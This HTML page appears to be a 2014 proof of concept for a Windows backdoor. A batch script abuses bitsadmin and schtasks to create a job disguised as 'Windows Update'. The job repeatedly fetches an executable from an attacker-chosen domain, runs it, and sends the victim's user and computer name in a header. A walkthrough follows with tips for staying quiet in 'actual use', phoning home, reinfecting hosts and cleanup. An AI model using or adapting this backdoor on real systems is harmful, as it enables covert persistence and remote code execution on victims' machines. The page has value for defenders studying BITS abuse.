<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Proof Of Concept BITS Backdoor</title>
</head><body># ------------------- BITS BACK DOOR ----------------------<br/>
# Themson Mester &nbsp;- 03/06/2014<br/>
# Configure: /AddFile &lt;Domain&gt; &nbsp;| &nbsp;/MO &lt;Minutes&gt; &nbsp;| &nbsp;/ED &lt;DATE&gt; | &nbsp;/ET &lt;Time&gt;<br/>
cd %TEMP%<br/>
bitsadmin /Reset &gt; NUL<br/>
bitsadmin /Create "Windows Update" &gt; NUL<br/>
bitsadmin /AddFile "Windows Update" http://&lt;Domain&gt;.com/kb%RANDOM%.exe %TEMP%\kb7468656d.exe &gt; NUL<br/>
bitsadmin /SetNotifyFlags "Windows Update" 1 &gt; NUL<br/>
bitsadmin.exe /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" &amp;&amp; start /B %TEMP%\kb7468656d.exe" &gt; NUL<br/>
bitsadmin /SetMinRetryDelay "Windows Update" 120 &gt; NUL<br/>
bitsadmin /SetCustomHeaders "Windows Update" "Caller:%USERNAME%@%COMPUTERNAME%" &gt; NUL<br/>
schtasks /delete /TN "Windows Update" /F<br/>
schtasks /CREATE /TN "Windows Update" /TR "%WINDIR%\system32\bitsadmin.exe /Resume \"Windows Update\"" /SC minute /MO 60 /ED 03/14/2014 /ET 09:00 /Z /IT /RU %USERNAME% &gt; NUL<br/>
<br/>
bitsadmin /List<br/>
schtasks /Run /TN "Windows Update"<br/>
schtasks /Query /TN "Windows Update"<br/>
# ------------------- EOF ---- them ---- EOF ---------------------<br/>
<br/>
<br/>
<br/>
Deploy the Backdoor:<br/>
A callback interval of 2 minutes is used for testing, 60-90 minutes is quieter for actual use.<br/>
<img src="image.png" /><br/>
<br/>
Phoning Home:<br/>
The initial schtasks /run triggers our first phone home as seen in our monitoring log.<br/>
<img src="image 2.png" /><br/>
<br/>
Losing our Session: <br/>
After killing the session, I rebooted the box, then logged on, off, and on again as two different users.<br/>
Our backdoor phones home soon after the user under whom it was deployed logs on.<br/>
<img src="image 3.png" /><br/>
<br/>
Reinfecting the Host:<br/>
We deploy a payload using the custom trigger-file name for the machine we wish to target.<br/>
<img src="image 4.png" /><br/>
<br/>
Host Acquires Payload:<br/>
The host whose trigger-file we used pulls down our payload.<br/>
<img src="image 5.png" /><br/>
<br/>
Back in Business:<br/>
Successful transfer triggers /SetNotifyCmdLine to /Complete our download and executes the payload.<br/>
I used a self-deleting PE, you could also use a blank file to trigger a reflective powershell execution.<br/>
<img src="image 6.png" /><br/>
<br/>
<br/>
At this point the BITS job is removed. <br/>
You can redeploy the backdoor by pasting it back into your shell. <br/>
If you ever need to preemptively clean the backdoor use:<br/>
bitsadmin /reset &amp;&amp; schtasks /delete /TN &lt;taskname&gt; /F<br/>
<br/>
<br/>
</body></html>